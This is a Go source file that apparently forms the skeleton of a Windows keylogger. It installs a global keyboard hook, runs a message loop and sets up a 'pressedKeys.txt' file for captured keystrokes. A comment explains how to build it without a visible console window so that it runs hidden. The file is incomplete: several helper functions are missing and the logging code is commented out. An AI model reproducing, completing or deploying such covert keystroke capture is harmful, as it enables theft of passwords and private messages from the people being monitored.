package main

import (
	"os"
	"syscall"
)

type Message struct {
	HWnd    syscall.Handle
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

// Variable used to hold the last pressed character (to ensure that double pressing DN occur)
var savingPath string = "./pressedKeys.txt"
var contentBuffer string = ""

// IMPORTANT NOTE: To hide CMD popup, you must use "go build -ldflags -H=windowsgui" command

func main() {
	// Attaching keyboard event hook
	SetHook(customCallbackOnKeypress)
	
	// Setting up variables for looped keyboard event checking
	var msg = MessageSetup()

	// Write the empty content to the file
	os.WriteFile(savingPath, []byte(""), 0644)

	go func() {
		// Reading the previous contents of the .keyclicks file so that it can be saved --> DN check for errors
		prevContent, _ := os.ReadFile(savingPath)
		contentBuffer += string(prevContent)

		MessageLoop(msg)
		
		// Ensuring that keyboard hook is removed to free up used memory
		Unhook()

	}() 
	select {}
}

func customCallbackOnKeypress(pressedKey []uint32) {
	
	// This function is run everytime a key event occurs >>> This can be a KEY_DOWN or a KEY_UP event.






	// for _, key := range pressedKeys {
	// 	// Updating the contentBuffer to include latest key press
	// 	contentBuffer += fmt.Sprintf("%c", key)
	// }

	// // Write content to the file
	// os.WriteFile(savingPath, []byte(contentBuffer), 0644)
	
}
